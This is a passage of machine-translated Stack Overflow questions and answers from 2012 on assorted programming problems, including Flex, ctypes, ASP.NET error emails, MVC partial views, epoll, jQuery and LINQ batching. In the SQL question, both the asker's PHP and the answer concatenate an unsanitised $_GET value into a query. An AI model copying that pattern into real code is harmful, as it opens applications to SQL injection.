* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T19:25:02.477

这里有一些接近你想要的东西：

```
var numChildren:Number = this.numChildren;
for (var i:int = 0; i < numChildren; i++) {
    var displayObject:DisplayObject = this.getChildAt(i);
    displayObject.addEventListener(FlexEvent.INITIALIZE, function (e:FlexEvent):void {
        trace("child " + displayObject.name +" is initializing" );
    });
    displayObject.addEventListener(FlexEvent.CREATION_COMPLETE, function (e:FlexEvent):void {
        trace("child " + displayObject.name +"'s creation is completed" );
    });                     
} 
```

您需要将其添加到主应用程序的`initialize`事件处理程序中。

# python - ctypes 中的 const void* 指针

> ID：13845608
> 
> 赞同：8
> 
> 时间：2012-12-12T17:47:10.000
> 
> 标签：python, python-2.7, buffer, constants, ctypes

如果我有一个 writable `buffer`，我可以使用`ctypes.c_void_p.from_buffer`函数来获取指向该缓冲区的 C 指针。

但是，如何处理不可写缓冲区？如何形成一个`const`指针，我可以传递给期望 a 的 C 代码，`const void*`而无需制作不可写缓冲区的可写副本？

我考虑`c_void_p.from_address`过，但缓冲区（和内存视图）似乎没有公开它们的地址。

* * *

一些澄清：

```
>>> import ctypes
>>> b = buffer("some data that supports the buffer interface, like a str")
>>> ptr = ctypes.c_void_p.from_buffer(b)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: buffer is read-only
>>> ptr = ctypes.c_void_p.from_buffer_copy(b)    # works, but has to copy data
>>> ptr = ctypes.CONST(c_void_p).from_buffer(b)  # (I'm making this one up)
>>> ptr = ctypes.c_void_p.from_address(???)      # could work; how to get addr? 
```

这将适用于`void some_api(const void* read_only_data)`：

```
>>> ctypes.cdll.LoadLibrary(some_lib).some_api(ptr) 
```

该方法`from_buffer_copy`有效，但需要先复制缓冲区。我正在寻找解决缓冲区可写要求的方法，因为没有人会在那里写，我想避免数据的冗余复制。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-16T09:51:39.253

您可以`char*`使用 ctypes 将 Python 字符串转换为，它指向存储 Python 字符串数据的实际内存。

随意双重施法。

# c# - ASP.NET - 发生异常时发送电子邮件

> ID：13845616
> 
> 赞同：5
> 
> 时间：2012-12-12T17:47:47.437
> 
> 标签：c#, asp.net, exception-handling

您好，感谢您花时间回答我的问题。

我有一个 asp.net webforms 应用程序，它是为一家中型公司的内部目的而构建的。

首先让我说我处理了在 CRUD 操作期间可能发生的所有异常并向用户显示适当的消息。但是，有没有一种方法可以集中方式，首先将 innerException 消息与堆栈跟踪一起通过电子邮件发送给我自己，然后将消息显示给用户？

换句话说，我不想创建像 EmailException() 这样的方法并在每个 catch(Exception ex) 块中调用它，但我想在第一次捕获所有异常的地方调用它一次。

如果我的问题不够清楚，请告诉我。

再次感谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T18:02:45.690

Elmah 很棒，但[Log4Net](http://logging.apache.org/log4net/)也会为您提供该功能以及其他日志记录功能。您只需要在您的 log4net 配置中添加一个[SmtpAppender](http://logging.apache.org/log4net/release/config-examples.html#smtpappender)定义，以及您想要/需要/希望的任何其他附加程序。

简单，容易做。捕获任何未处理异常的最简单方法是[`Application_Error()`](http://msdn.microsoft.com/en-us/library/24395wz3%28v=vs.100%29.aspx)向您的`global.asax`. 它由 Asp.Net 运行时调用并将捕获

> 处理请求时所有未处理的 ASP.NET 错误 — 换句话说，所有未使用 Try/Catch 块或页面级错误处理程序捕获的错误。

需要注意的是，Elmah、log4net 和 global.asax`Application_Error()`方法都可以愉快地共存。Elmah 只是坐在那里，*轻声细语*，倾听，记录任何经过的异常。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T17:51:22.620

[Elmah](http://code.google.com/p/elmah/)非常适合：

> *   记录几乎所有未处理的异常。
> *   用于远程查看重新编码异常的整个日志的网页。
> *   用于远程查看任何记录的异常的完整详细信息的网页，包括彩色堆栈跟踪。*在许多情况下，即使关闭了 customErrors 模式，您也可以查看 ASP.NET 为给定异常生成的原始黄屏死机。
> *   **每个错误发生时的电子邮件通知。**
> *   来自日志的最后 15 个错误的 RSS 提要。

这是一个[配置示例](https://stackoverflow.com/questions/34401/send-email-from-elmah)。

# yii - Yii ajaxSubmitButton url 问题

> ID：13845620
> 
> 赞同：-1
> 
> 时间：2012-12-12T17:48:01.587
> 
> 标签：yii

我有一个带有此代码的表格

```
$form = $this->beginWidget('CActiveForm', array(
            'id' => 'user-contact-info-form',
    'action' => Yii::app()->createUrl('user/editContactInfo'), //<- your form action here
            'enableAjaxValidation' => false,
        )); 
```

和带有此代码的 ajax 提交按钮：

```
echo CHtml::ajaxSubmitButton('Save !!!','mysite/updateInfo',array(
   'type'=>'POST',
   'success'=>'js:function(data){
       alert(data);
       }
   }',
)); 
```

而不是定义 url 'mysite/updateInfo' 创建的 jquery 是：

```
jQuery('body').undelegate('#yt0','click').delegate('#yt0','click',function(){jQuery.ajax({'type':'post','data':'_lang=en&YII_CSRF_TOKEN=83434e217ef914b4f6a3602a60cba77b803567c7','success':function(data) {window.location.reload();},'url':'/alice/index.php?r=user/update','cache':false});return false;}); 
```

这不是我的意思。我到底做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T19:38:51.793

你应该使用

```
CHtml::ajaxSubmitButton('Save !!!',Yii::app()->createUrl('mysite/updateInfo'),... 
```

或者

```
CHtml::ajaxSubmitButton('Save !!!',array('mysite/updateInfo'),... 
```

# c# - MVC 4 - 如何使用 Ajax.ActionLink 渲染带有部分的视图？

> ID：13845621
> 
> 赞同：3
> 
> 时间：2012-12-12T17:48:04.447
> 
> 标签：c#, jquery, twitter-bootstrap, asp.net-mvc-4

我正在用 MVC 4、knout、web api、bootstrap 等构建一个 SPA。我想知道是否有更好的解决方案，或者我在以下情况下做错了什么：

MainLayout 仅适用于正文：

```
<body>
<div class="container-fluid">
        <div class="row-fluid">
            top Menu Here
        </div>
        <div class="row-fluid">
            <div class="span2">
                Left Menu Here with links like:
                @Ajax.ActionLink("Management and Configuration", "Index", "Environments", new AjaxOptions() { InsertionMode = InsertionMode.Replace, UpdateTargetId = "ContentPanel" })</li>

                <div id="footer">
                    <p>&copy; Copyright 2012</p>
                </div>
            </div>
            <div class="span10">
                <section>                    
                    <div id="alerts"></div>
                    <div id="ContentPanel">
                        @this.RenderBody()
                    </div>
                </section>
            </div>
        </div>
</div>
    @Scripts.Render("~/js")
    @Scripts.Render("~/js/jqueryui")
    @Scripts.Render("~/js/jqueryval")
    @Scripts.Render("~/js/knockout")
    @Scripts.Render("~/js/modernizr")
    @Scripts.Render("~/js/app")
    @Scripts.Render("~/js/widgets")
    @RenderSection("Scripts", required: false)
</body> 
```

1st - I have a Side Nav Menu with bootstrap and when a link is selected the class change to active so the background will be different so i use jquery to acomplish this part.

```
$(document).ready(function() {
$('#mainMenu > li').click(function (e) {
    //e.preventDefault();
    $('#mainMenu> li').removeClass('active');
    $(this).addClass('active');
});
//BTW i want some slide effect for the views incoming, 
//correct me if this is not the correct way to do it
$("#ContentPanel").effect("slide", {}, 700);}); 
```

2nd - 使用控制器查看代码：

控制器：

```
public ActionResult Index()
{
    return View();
} 
```

看法：

```
@{
ViewBag.Title = "Environments";
}
@section Scripts {

    Script Templates Here

    Scripts for Knockout Viewmodel and Actions Here (i will move to another file)

}
<div class="span3" data-bind="block : $root.isLoading">
    All the HTML Content Here
</div> 
```

3th - 我为 Ajax 调用创建了一个新的布局，这样我就可以为每个视图保留脚本部分。

新版面：

```
@RenderBody()

@RenderSection("scripts", required: false) 
```

4th - 我更改了 _ViewStart 文件来管理布局：

_ViewStart 文件：

```
@{
  Layout = Request.IsAjaxRequest() ? "~/Views/Shared/_Layout.cshtml" : "~/Views/Shared/_BootstrapLayout.cshtml";
} 
```

最后，一切正常，但就像我说的，有没有更好的解决方案？还是我使用了一些不好的资源？

此致，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-26T14:09:30.627

您也可以使用局部视图。我可以用代码给你例子。

假设我正在设计管理面板，左侧我有所有操作链接（ajax.actionlink），右侧我根据点击的链接加载部分视图。

这是我的主要观点（父视图）：

```
@model club.Models.M_Reg

@{
 ViewBag.Title = "Admin";
}

<html><body>
 <br clear="all" /><br /><br />

 <div class="container">
 <h4 style="float:right">Welcome @Model.FName </h4>
     @if (Model != null)
     {
    <div class="col-xs-6 col-lg-3 col-md-3" >
    <div >
    <h2>Admin Panel</h2>

    </div>

    <div class="row">
      <div id="sidebar" class="sidebar-nav span3">
        <ul style="background-color:#EEE !important" class="nav nav-tabs nav-stacked">
          <li class="nav-menu">@Ajax.ActionLink("Member notificaiton", "MemberNotification", "Admin", new AjaxOptions { UpdateTargetId = "result" })</li>
          <li class="nav-menu">@Ajax.ActionLink("View Member", "ViewMember", "Admin", new AjaxOptions { UpdateTargetId = "result" })</li>
          <li class="nav-menu">@Ajax.ActionLink("Request for Change MobileNumber and EmailId", "ChangeMob", "Admin", new AjaxOptions { UpdateTargetId = "result", HttpMethod = "Get", InsertionMode = InsertionMode.Replace })</li>
          <li class="nav-menu">@Ajax.ActionLink("Manage System", "ManageSystem", "Admin", new AjaxOptions { UpdateTargetId = "result" })</li>
          <li class="nav-menu">@Ajax.ActionLink("Post Event", "PostEvent", "Admin", new AjaxOptions { UpdateTargetId = "result" })</li>
          <li class="nav-menu">@Ajax.ActionLink("Send Notification", "SendNotification", "Admin", new AjaxOptions { UpdateTargetId = "result" })</li>
          <li class="nav-menu">@Ajax.ActionLink("Add Admin", "AddAdmin", "Admin", new AjaxOptions { UpdateTargetId = "result" })</li>
          <li class="nav-menu">@Ajax.ActionLink("Change Password", "ChangePassword", "Admin", new AjaxOptions { UpdateTargetId = "result" })</li>
        </ul>
    </div>
   </div>
  </div> 

   <div id="result" class="col-lg-9 col-sm-6 col-md-9 " >

   </div>

  }

  </div> 
```

现在我将返回部分视图：

这是我的控制器代码：

```
 public ActionResult ManageSystem()
    {
        return PartialView("ManageSystem");
    } 
```

这个部分视图将显示在结果 div 上，因为我们设置了 updatetrgetid=result

您还可以在返回部分视图之前检查 ajax 请求，如下所示：

```
if (Request.IsAjaxRequest())
        {

            var db = new clubDataContext();
            return PartialView("ViewEvent", db.tblEvents.ToList());
        }
        else
            return RedirectToAction("Login", "User"); 
```

# heroku - heroku没有更新

> ID：13845630
> 
> 赞同：1
> 
> 时间：2012-12-12T17:48:41.887
> 
> 标签：heroku

我正在使用 Heroku 部署我的 rails 应用程序。但是当我提交到 git 并推送到 Heroku 时，有些东西不会从我的本地应用程序更新

麻烦拍摄 常见的事情 更新 git 本地检查状态 推送到 heroku heroku 开始时没有错误 更改没有传播到 heroku ？

得到这个！文本或 html 更改传播

我添加了一个 jquery 脚本，当我查看它时它没有显示在源代码中？

该脚本在 dev 和 prod 本地运行良好，并且 jquery 显示在源代码中？

我不能把它送到 heroku 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-09T03:19:55.453

确保你在`branch master`我刚刚遇到了类似的问题。我做了一些承诺。在本地检查它们，它们工作正常，但它们没有出现在 heroku 上。我什至尝试过`heroku destroy`，`heroku create`然后我意识到我在我的工作/开发分支上。一旦我这样做`git checkout master`并`git merge development-branch`跟着`git push heroku master`，变化就会出现在heroku上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T22:13:56.017

你确定你的提交是正确的。当你部署时，Heroku 使用一个全新的 slug 来运行你的应用程序（这是你最新提交的编译版本），所以改变一些东西而不是其他东西的想法是不可能的。

要么您的提交不正确，要么您遇到了某种缓存问题。

# matlab - 使用 Matlab ODE 求解器收敛

> ID：13845633
> 
> 赞同：3
> 
> 时间：2012-12-12T17:48:46.347
> 
> 标签：matlab, ode

嗨，我正在解决一个初始值 ODE 问题，并希望能够绘制收敛图。我检查了文档，发现在每个时间步都会计算错误，但我找不到返回这个值的方法。有没有人有任何想法，也许是通过玩输出函数（来自 odeset）。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T05:30:40.957

我一直在这里寻找自己的答案。我发现的最接近的方法是使用[odeset 函数](http://www.mathworks.co.uk/help/matlab/ref/odeset.html#f92-1039598)改变 ode45 的初始步长和最大步长 理想情况下，我们希望设置**最小**步长来测试收敛性，但此处未提供。

# python - epoll如何工作的一般解释？

> ID：13845634
> 
> 赞同：7
> 
> 时间：2012-12-12T17:48:51.820
> 
> 标签：python, rabbitmq, file-descriptor, epoll

我正在写一篇关于从数据库轮询（通过同步存储过程调用）切换到消息队列（通过 pub/sub）的技术文章。我希望能够解释轮询数据库与建立与 AMQP 代理的连接和配置消息处理程序相比有何巨大不同和重得多。

有人可以在这里提供解释，或者指出一个很好的高级教程，说明当通知套接字上有新数据可用时，epoll 如何工作？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-12T19:24:34.810

我假设“epoll 的工作原理”是指从用户的角度来看它是如何工作的（比如，你的代码如何得到通知，以及应该如何处理它），而不是内核的观点（比如, epoll 是如何实现的）。

简短的版本非常简单：就像`poll`，除了两件事：

1.  它使用不透明数据结构的句柄，因此您不会在内核边界上来回传递尽可能多的数据。
2.  它有一些`poll`没有的选项（特别是边缘触发和一次性通知），可以让您在某些情况下编写更高效的代码。

（还有一个事实是它只适用于 linux。BSD 和相关系统有`kqueue`，获得一些相同优势的明显不同的方式，Solaris 有`/dev/poll`，等等，而一些 *nixes 没有等价物。所以如果你想写可移植代码，您要么必须使用`poll`，要么使用一些更高级别的库，如`libevent`，或者编写自己的等价物`libevent`。）

如果您已经了解`select`和`poll`，[那么维基百科文章](http://en.wikipedia.org/wiki/Epoll)及其参考文献中链接[的博客文章](http://kovyrin.net/2006/04/13/epoll-asynchronous-network-programming/)应该在它们之间告诉您几乎所有您需要知道的内容，并且[手册页](http://man7.org/linux/man-pages/man7/epoll.7.html)将填补任何空白。

如果没有，先去了解一下`poll`，只有这样了解`epoll`不同之处才有意义。

我仍然不确定这与您的主要问题有何关系。您可以`epoll`在`inotify`数据库文件上，或在消息系统上`pipe`或`socket`在消息系统的基础上，或几乎任何其他可以表示为 linux 中文件描述符的东西，所以我不确定理解`epoll`将如何帮助您解释轮询数据库之间的区别与轮询消息队列相比。两者之间当然存在巨大差异，但事件触发机制不是其中之一。

# jquery - 单击“.submit”按钮时如何折叠此表单？

> ID：13845635
> 
> 赞同：0
> 
> 时间：2012-12-12T17:48:52.437
> 
> 标签：jquery, html, jquery-mobile, collapsable

我有一个可折叠的（输入您的信用卡信息）表格。当我单击它时，它会打开，但是当我单击提交时，我希望它关闭。这是我的html：

```
<div class= "addStuff">
<div data-role="collapsible" data-inset="true" id="ccdiv">
   <h5> New credit card</h5>         
      <div data-role="fieldcontain">
            <form id = "myForm">
        <input type="password" name="credit_card_number" id="credit_card_number" value="" placeholder="Credit Card Number">
        <input type="password" name="security_code" id="security_code" value="" placeholder="Security Code">
        <input type="date" name="expiration_date" id="expiration_date" value="" placeholder="Expiration Date">
        <input type="password" name="name" id="name" value="" placeholder="Name On Card">
        <input type="password" name="street_address" id="street_address" value="" placeholder="Street Address">
        <input type="text" name="city" id="city" value="" placeholder="City">
        <input type="number" name="zip_code" id="zip_code" value="" placeholder="Zip Code">

            <button type="button" class="submit" name="submit" value="submit">Submit</button>
            </form>
      </div>
</div> 
```

这是我的 JS 尝试：

```
$(document).ready(function() {
$('.submit').click(function(){
    var creditcard = $('#credit_card_number').val();
    $('.accounts #CreditCards div[data-role="content"] #swipeMe').append('<li data-swipeurl="#" ><a href="#">' + creditcard + '</a></li>');
   // refresh view 
   $('#CreditCards ul').listview('refresh');

   // hide form
 alert('test'); 

 $('#myForm').slideUp();
 $('#myForm').trigger('collapse');

    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:15:15.523

这是我尝试让您的代码正常工作的 JsFiddle 的链接 [http://jsfiddle.net/rvqRX/](http://jsfiddle.net/rvqRX/)

我逐行逐行注释，一次注释掉一个，发现我必须注释掉它才能正确运行的唯一行是这个

```
$('#CreditCards ul').listview('refresh'); 
```

不知道为什么……这对你有意义吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:53:40.827

将一个添加`ID`到您的表单`<form id="myForm">...</form>`

[使用JQuery 动画](http://jqueryui.com/effect/)将表单折叠到您想要的位置：

```
$('#myForm').slideUp(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:55:22.277

在表单的 submit() 上，确保使用 JQuery 方法调用折叠表单的触发器。那是你要找的吗？

# java - 不需要的 JDBC 消息忽略 log4j 配置

> ID：13845637
> 
> 赞同：2
> 
> 时间：2012-12-12T17:48:53.183
> 
> 标签：java, spring, hibernate, log4j, h2

我对 log4j 或 Spring 或 H2 配置有疑问。我似乎找不到罪魁祸首。我的问题是，虽然 log4j 的日志记录配置非常严格，但我仍然会从系统中的某些组件中获得不需要的日志。

我使用 Spring Framework 和 Hibernate 来访问 H2 数据库。这三个之一产生的日志似乎直接打印到`System.out`.

我的日志输出：

```
12-12 18:41:08 jdbc[2]: 
/*SQL */SET DB_CLOSE_DELAY -1;
12-12 18:41:08 jdbc[2]: 
/**/Connection conn1 = DriverManager.getConnection("jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1;MODE=Oracle;TRACE_LEVEL_SYSTEM_OUT=    2", "", "");
12-12 18:41:08 jdbc[2]: 
/*SQL #:1*/CALL LOCK_MODE();
12-12 18:41:08 database: disconnecting session #2
[main] WARN  org.hibernate.internal.util.xml.DTDEntityResolver  - HHH000223: Recognized obsolete hibernate namespace http://hibernate.sourceforge.net/. Use namespace http://www.hibernate.org/dtd/ instead. Refer to Hibernate 3.6 Migration Guide! 
```

如您所见，唯一正确的记录器行是最后一行。我的 log4j 配置是这样的：

```
# Set root logger level to DEBUG and its only appender to A1.
log4j.rootLogger=INFO, A1

log4j.logger.org.hibernate=WARN
log4j.logger.org.springframework=WARN
log4j.logger.org.h2=WARN
log4j.logger.org.java.sql=WARN

# A1 is set to be a ConsoleAppender.
log4j.appender.A1=org.apache.log4j.ConsoleAppender

# A1 uses PatternLayout.
log4j.appender.A1.layout=org.apache.log4j.PatternLayout
log4j.appender.A1.layout.ConversionPattern=[%t] %-5p %c %x - %m%n 
```

我如何找出是谁在制造这些信息，以及如何让他闭嘴？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T19:53:11.087

并非每个 Java 软件都使用 log4j。

在这种情况下，H2 生成可以使用 slf4j 控制的跟踪，如*“使用其他日志记录 API”*部分[的文档](http://www.h2database.com/html/features.html?highlight=logging&search=logging#other_logging)中所述。

# html - 子菜单中悬停状态宽度的 CSS 问题

> ID：13845638
> 
> 赞同：3
> 
> 时间：2012-12-12T17:48:54.270
> 
> 标签：html, css, menu, submenu

出于某种原因，我`:hover`在子菜单中的状态仅延伸到覆盖单词，但不会延伸子菜单框的宽度。

这是代码[`jsfiddle`](http://jsfiddle.net/kjetterman/NfjXY/58/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:53:01.757

将以下规则添加到您的 CSS：

`overflow:hidden`到`li:hover ul.sub`

`display:block`到`ul.sub li a`

**[jsFiddle 示例](http://jsfiddle.net/j08691/NfjXY/62/)**

# windows-8 - 在保持触摸选定项目的能力的同时启用鼠标滚动

> ID：13845641
> 
> 赞同：4
> 
> 时间：2012-12-12T17:49:00.470
> 
> 标签：windows-8, windows-runtime, winrt-xaml

我正在使用 GridView 来显示项目列表。我需要能够使用鼠标滚轮在包含 GridView 的页面中滚动。这很容易通过覆盖 GridView 的模板来实现

```
<GridView.Template>
        <ControlTemplate>
            <ItemsPresenter />
        </ControlTemplate>
</GridView.Template> 
```

但是，我还需要可以从触摸设备中选择这些项目。这通常通过向下轻弹一个项目来完成，之后它将被选中。应用上述模板覆盖后，触摸选择机制中断。

我进入 Blend 并开始查看 GridView 的默认模板，如下所示

```
<ControlTemplate
    TargetType="GridView">
    <Border
        BorderBrush="{TemplateBinding BorderBrush}"
        BorderThickness="{TemplateBinding BorderThickness}"
        Background="{TemplateBinding Background}">
        <ScrollViewer
            x:Name="ScrollViewer"
            BringIntoViewOnFocusChange="{TemplateBinding ScrollViewer.BringIntoViewOnFocusChange}"
            HorizontalScrollMode="{TemplateBinding ScrollViewer.HorizontalScrollMode}"
            HorizontalScrollBarVisibility="{TemplateBinding ScrollViewer.HorizontalScrollBarVisibility}"
            IsHorizontalRailEnabled="{TemplateBinding ScrollViewer.IsHorizontalRailEnabled}"
            IsHorizontalScrollChainingEnabled="{TemplateBinding ScrollViewer.IsHorizontalScrollChainingEnabled}"
            IsVerticalScrollChainingEnabled="{TemplateBinding ScrollViewer.IsVerticalScrollChainingEnabled}"
            IsVerticalRailEnabled="{TemplateBinding ScrollViewer.IsVerticalRailEnabled}"
            IsDeferredScrollingEnabled="{TemplateBinding ScrollViewer.IsDeferredScrollingEnabled}"
            TabNavigation="{TemplateBinding TabNavigation}"
            VerticalScrollBarVisibility="{TemplateBinding ScrollViewer.VerticalScrollBarVisibility}"
            VerticalScrollMode="{TemplateBinding ScrollViewer.VerticalScrollMode}"
            ZoomMode="{TemplateBinding ScrollViewer.ZoomMode}">
            <ItemsPresenter
                HeaderTemplate="{TemplateBinding HeaderTemplate}"
                Header="{TemplateBinding Header}"
                HeaderTransitions="{TemplateBinding HeaderTransitions}"
                Padding="{TemplateBinding Padding}" />
        </ScrollViewer>
    </Border>
</ControlTemplate> 
```

如果我删除 ScrollViewer 或以任何方式禁用水平滚动部分，则触摸选择将停止工作。

如何同时启用鼠标滚动和触摸选择？

澄清一下，我不需要这些动作同时发生。两者只需要在同一个页面上为同一个 GridView 单独工作。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T23:03:04.743

我不认为你的情况是可能的。里面有网格的 SV 是问题所在。MSDN 文档说 GridView 防止 PointerWheelChanged 事件冒泡：

请参阅[GridView 文档：](http://msdn.microsoft.com/en-us/library/windows/apps/xaml/windows.ui.xaml.controls.gridview.aspx)

> 警告 PointerWheelChanged 事件不会从 GridView 冒泡。这意味着如果指针位于 GridView 上，则内部具有 GridView 的控件不会收到鼠标滚轮更改消息。例如，如果您将 GridView 放在 ScrollViewer 内，则当指针位于 GridView 上方时，您无法使用鼠标滚轮滚动 ScrollViewer。

# sql - 表单中的 SQL 查询，有顺序

> ID：13845643
> 
> 赞同：0
> 
> 时间：2012-12-12T17:49:09.050
> 
> 标签：sql, forms

我有这个查询：

```
$query = 'SELECT ForteID, Disposition, appNumber, Finance_Num, Num_Payments, ACH_CC, Notes, Date FROM CSLogs.dbo.Logs WHERE ForteID = ' . $_GET['ForteID']; 
```

它工作正常，但我想添加这个：

```
ORDER BY Date DESC 
```

但是，当我在 SQL Management Studio 中时，我可以在 sql 查询中添加它的唯一位置是在 Where 语句之后的末尾，但语句在 Where ForteID = 之后的 ' 处结束。因此，添加 Order By 不起作用并破坏代码。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:51:54.203

你有没有尝试过：

```
$query = 'SELECT ForteID, Disposition, appNumber, Finance_Num, Num_Payments, ACH_CC, Notes, Date FROM CSLogs.dbo.Logs WHERE ForteID = '.$_GET['ForteID'].' ORDER BY Date DESC'; 
```

# jquery - 带有缩略图单击的 jQuery 交叉淡入淡出 2 图像

> ID：13845644
> 
> 赞同：2
> 
> 时间：2012-12-12T17:49:15.680
> 
> 标签：jquery, html, jquery-selectors, fadein, fadeout

我试图让我的淡入/淡出比现在更平滑> [JSFIDDLE](http://jsfiddle.net/Jwtkf/1/)

目前它在淡化图像时非常清晰（因为它似乎在第二个甚至开始之前先淡出第一张图像）。

JS：

```
$(document).ready(function() {
    $('#thumbImgs').hoverscroll({
        fixedArrows: true,
        vertical : true,
        width: 250,
        height: 600,
        arrows: false,
        rtl: true,
        thespeed: 30
    });
});

$("#thumbImgs li").live('click', function(e) { 
    var largeImgURL = $(this).attr('id');

    $('#bigPic').fadeOut('fast');
    $('#bigPic').fadeIn('slow').html('<img src="http://www.zzzz.com/test/' + largeImgURL + '" width="1000" height="700" alt="">');
}); 
```

的HTML：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />

    <title>HoverScroll Test Page</title>

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script type="text/javascript" src="http://rascarlito.free.fr/hoverscroll/js/hoverscroll/jquery.hoverscroll.js"></script>    
</head>
<body>
    <h1>HoverScroll Test Page</h1>

    <div id="theThumbs">
      <ul id="thumbImgs">
        <li id="img1.jpg"><img src="http://www.zzzz.com/test/img1_tmb.jpg" width="120" height="120" alt=""></li>
        <li id="img2.jpg"><img src="http://www.zzzz.com/test/img2_tmb.jpg" width="120" height="120" alt=""></li>
        <li id="img3.jpg"><img src="http://www.zzzz.com/test/img3_tmb.jpg" width="120" height="120" alt=""></li>
        <li id="img4.jpg"><img src="http://www.zzzz.com/test/img4_tmb.jpg" width="120" height="120" alt=""></li>
        <li id="img5.jpg"><img src="http://www.zzzz.com/test/img5_tmb.jpg" width="120" height="120" alt=""></li>
      </ul>
    </div>

    <div id="bigPic">
        <img src="http://www.zzzz.com/test/img1.jpg" width="1000" height="700" alt="">
    </div>

<script type="text/javascript">

    $(document).ready(function() {
        $('#thumbImgs').hoverscroll({
            fixedArrows: true,
            vertical : true,
            width: 250,
            height: 600,
            arrows: false,
            rtl: true,
            thespeed: 30
        });
    });

    $("#thumbImgs li").live('click', function(e) { 
        var largeImgURL = $(this).attr('id');

        $('#bigPic').fadeOut('fast');
        $('#bigPic').fadeIn('slow').html('<img src="http://www.zzzz.com/test/' + largeImgURL + '" width="1000" height="700" alt="">');
    });

</script>
</body>
</html> 
```

任何帮助都会很棒！谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:06:08.023

通常，当交叉衰落发生时，它发生在多个元素之间。从您的示例中，您尝试在 1 个元素之间交叉淡入淡出。

看看下面的小提琴，它可能会为你指明一个好的方向。[http://jsfiddle.net/Nv6gp/2/](http://jsfiddle.net/Nv6gp/2/)

```
$('#thumbImgs').on('click', 'li', fade);

var imgs = $('#imgs li');

function fade(e) {
    var _self = imgs.eq($(e.currentTarget).index());

    imgs.fadeOut();
    _self.fadeIn();
}​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:55:49.070

这是否更好？[小提琴](http://jsfiddle.net/Jwtkf/2/)

我在动画`fadeIn`的回调函数中添加了慢。`fadeOut`这对我来说似乎更顺畅。如果这不是您想要的，您将不得不更具描述性。

```
$('#bigPic').fadeOut('fast', function() { 
       $('#bigPic').fadeIn('slow').html('<img src="http://www.zzzz.com/test/' + largeImgURL + '" width="1000" height="700" alt="">');
}); 
```

# c# - 使用 LINQ 将列表转换为列表列表

> ID：13845650
> 
> 赞同：4
> 
> 时间：2012-12-12T17:49:25.807
> 
> 标签：c#, linq

我有一个值列表：

```
IList<V> values = { V1, V2, V3, V4, V5, V6, V7 }; 
```

我想将列表转换为列表列表，其中每个子列表都是指定的大小。每个子列表的大小可能会有所不同。例如：

```
IList<IList<V>> values_size2 = { { V1, V2 }, { V3, V4 }, { V5, V6 }, { V7 } };
IList<IList<V>> values_size3 = { { V1, V2, V3 }, { V4, V5, V6 }, { V7 } };
IList<IList<V>> values_size4 = { { V1, V2, V3, V4 }, { V5, V6, V7 } }; 
```

我可能可以使用嵌套循环很容易地做到这一点，但想知道是否有一种聪明的方法可以使用 LINQ 做到这一点？

我最初的想法是以某种方式使用[Aggregate](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.aggregate.aspx)方法，但没有立即想到。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T17:51:06.503

这是一个基于泛型`IEnumerable`的`Batch`函数。您只需将返回类型从 更改`IEnumerable<IEnumerable<T>>`为`IEnumerable<IList<T>>`没有其他更改（因为在我的实现中它已经是一个列表。要更改整个内容以返回一个列表列表，您需要在结果上调用 `ToList ，或者创建一个更多涉及重构。

请注意，从技术上讲，这不是使用 LINQ，它只是创建一种新方法，该方法使用 LINQ 常用的相同样式和模式。

```
public static IEnumerable<IEnumerable<T>> Batch<T>(this IEnumerable<T> source
    , int batchSize)
{
    //TODO validate parameters

    List<T> buffer = new List<T>();

    foreach (T item in source)
    {
        buffer.Add(item);

        if (buffer.Count >= batchSize)
        {
            yield return buffer;
            buffer = new List<T>();
        }
    }
    if (buffer.Count >= 0)
    {
        yield return buffer;
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-12T17:51:50.193

您可以使用[MoreLINQ](https://github.com/morelinq/MoreLINQ/) Batch 扩展（可从[Nuget 获得](http://nuget.org/packages/morelinq)）：

```
IList<IList<V>> values_size2 = values.Batch(2);
IList<IList<V>> values_size3 = values.Batch(3);
IList<IList<V>> values_size4 = values.Batch(4); 
```

您也可以[在此处](https://github.com/morelinq/MoreLINQ/blob/master/MoreLinq/Batch.cs)查看来源。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-18T18:27:56.493

```
 public static IEnumerable<IEnumerable<T>> Chunks<T>(this IEnumerable<T> source, int chunkSize)
 {
     while (source.Any())
     {
         yield return source.Take(chunkSize);
         source = source.Skip(chunkSize);
     }
 } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-06-16T15:28:41.300

使用 .NET 6，您可以使用[新的`Chunk`Linq 方法](https://devblogs.microsoft.com/dotnet/announcing-net-6-preview-4/#chunk)

```
List<IList<V>> values_size2 = values.Chunk(2).ToList();
